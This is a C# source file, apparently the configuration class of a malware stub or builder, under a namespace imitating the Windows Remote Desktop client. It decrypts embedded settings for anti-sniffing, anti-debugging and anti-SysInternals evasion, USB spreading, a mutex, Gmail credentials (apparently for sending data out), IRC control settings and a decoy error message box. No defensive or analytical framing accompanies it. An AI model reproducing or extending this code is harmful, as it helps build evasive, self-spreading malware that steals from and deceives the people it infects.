using Microsoft.VisualBasic;
using System.Windows.Forms;

namespace mstsc.Aries.Antis
{
    sealed class Config
    {
        public static string FSplit = "!_!";
        public static string FSplit2 = "X!@";
        public static string FSplit3 = "h0c";
        public static string FSplit4 = "GU0";

        public static string[] ErrAnti;
        public static string[] File;
        public static string[] Settings;
        public static string[] IRCSettings;

        public enum AntiType : int
        {
            ErrorTitle = 1,
            ErrorBody = 2,
            GmailUser = 7,
            GmailPass = 8
        }

        public enum SafeAntiType : int
        {
            CrashType = 1,
            AntiSniffDebug = 2,
            compressed = 3,
            File1USBSpread = 4,
            AntiSysInternals = 5,
            Mutex = 6,
            Encrypted = 7
        }


        public string Anti(AntiType type)
        {
            SimpleAES aesAll = new SimpleAES();
            return aesAll.Decrypt(System.Text.Encoding.Default.GetBytes(Strings.Split(ErrAnti[(int)type], FSplit2, -1, CompareMethod.Text)[0]));
        }


        public string SafeAnti(SafeAntiType type)
        {
            return Strings.Split(Settings[(int)type], FSplit3, -1, CompareMethod.Text)[0];
        }


        public struct Settings_
        {
            public MessageBoxIcon GetIcon
            {
                get
                {
                    switch (Strings.Split(ErrAnti[5], FSplit2, -1, CompareMethod.Text)[0])
                    {
                        case "1":
                            return MessageBoxIcon.Error;
                        case "2":
                            return MessageBoxIcon.Exclamation;
                        case "3":
                            return MessageBoxIcon.Question;
                        case "4":
                            return MessageBoxIcon.None;
                        case "5":
                            return MessageBoxIcon.Information;
                        default:
                            return MessageBoxIcon.Error;
                    }
                }
            }
        }
    }
}